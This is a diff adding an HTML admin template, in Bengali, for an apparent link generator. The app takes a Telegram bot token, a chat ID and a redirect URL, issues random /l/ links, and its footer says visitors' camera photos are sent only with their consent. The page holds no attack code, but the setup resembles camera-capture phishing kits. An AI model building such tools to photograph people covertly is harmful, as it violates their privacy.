@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>{{ app_title }} - Admin</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    body { font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; background:#0f1220; color:#e9eaf3; margin:0; }
+    .wrap { max-width: 900px; margin: 40px auto; padding: 0 16px; }
+    .card { background:#171a2b; border:1px solid #232743; border-radius:16px; padding:24px; box-shadow: 0 10px 30px rgba(0,0,0,.25); }
+    label { display:block; font-weight:600; margin:10px 0 6px; }
+    input { width:100%; padding:12px; border-radius:10px; border:1px solid #2a2e52; background:#0d1020; color:#e9eaf3; }
+    button { background:#6c63ff; border:none; padding:12px 16px; border-radius:12px; color:white; font-weight:700; cursor:pointer; }
+    button:hover { opacity:.9; }
+    .grid { display:grid; grid-template-columns:1fr 1fr; gap:16px; }
+    .mt { margin-top: 16px; }
+    .link-item { background:#121527; border:1px solid #2a2e52; padding:12px; border-radius:10px; }
+    code { background:#0d1020; padding:2px 6px; border-radius:6px; }
+    .footer { opacity:.75; font-size: 13px; margin-top: 18px; }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <h1 style="margin:0 0 16px">{{ app_title }}</h1>
+    <div class="card">
+      <h2 style="margin-top:0">কনফিগারেশন</h2>
+      <form method="post" action="/admin/save">
+        <div class="grid">
+          <div>
+            <label>Telegram Bot Token</label>
+            <input name="bot_token" placeholder="123456:ABC-DEF..." value="{{ (conf and conf['bot_token']) or '' }}" required />
+          </div>
+          <div>
+            <label>Admin Chat ID</label>
+            <input name="admin_chat_id" placeholder="e.g. 6430066760" value="{{ (conf and conf['admin_chat_id']) or '' }}" required />
+          </div>
+        </div>
+        <label class="mt">Redirect URL</label>
+        <input name="redirect_url" placeholder="https://example.com" value="{{ (conf and conf['redirect_url']) or '' }}" required />
+        <div class="mt"><button type="submit">Save</button></div>
+      </form>
+    </div>
+
+    <div class="card" style="margin-top:20px">
+      <h2 style="margin-top:0">নতুন লিংক জেনারেট</h2>
+      <p>র‍্যান্ডম ৭ অক্ষরের লিংক পাবেন: <code>/l/&lt;slug&gt;</code></p>
+      <button id="gen">Generate Link</button>
+      <div id="out" class="mt"></div>
+    </div>
+
+    <div class="card" style="margin-top:20px">
+      <h2 style="margin-top:0">সাম্প্রতিক লিংক</h2>
+      {% if links %}
+        <div class="grid" style="grid-template-columns:1fr 1fr 1fr">
+          {% for row in links %}
+            <div class="link-item">
+              <div><strong>{{ row['slug'] }}</strong></div>
+              <div style="font-size:13px; opacity:.8">{{ row['created_at'] }}</div>
+              <div class="mt"><a style="color:#90a0ff" href="{{ (self_base or '') + '/l/' + row['slug'] if self_base else url_for('landing', slug=row['slug'], _external=True) }}" target="_blank">Open</a></div>
+            </div>
+          {% endfor %}
+        </div>
+      {% else %}
+        <p>কোনো লিংক নেই।</p>
+      {% endif %}
+      <div class="footer">নোট: এই ডেমো সম্পূর্ণ স্বচ্ছ সম্মতিভিত্তিক—ভিজিটর নিজে বোতাম চাপলে তবেই ক্যামেরা চালু হবে ও ছবি পাঠানো হবে।</div>
+    </div>
+  </div>
+
+  <script>
+    const genBtn = document.getElementById('gen');
+    const out = document.getElementById('out');
+    genBtn?.addEventListener('click', async () => {
+      out.textContent = 'Generating...';
+      const res = await fetch('/admin/new-link', { method: 'POST' });
+      if (!res.ok) { out.textContent = 'Set config first or server error.'; return; }
+      const js = await res.json();
+      out.innerHTML = 'New link: <a style="color:#90a0ff" href="'+js.url+'" target="_blank">'+js.url+'</a>';
+    });
+  </script>
+</body>
+</html>
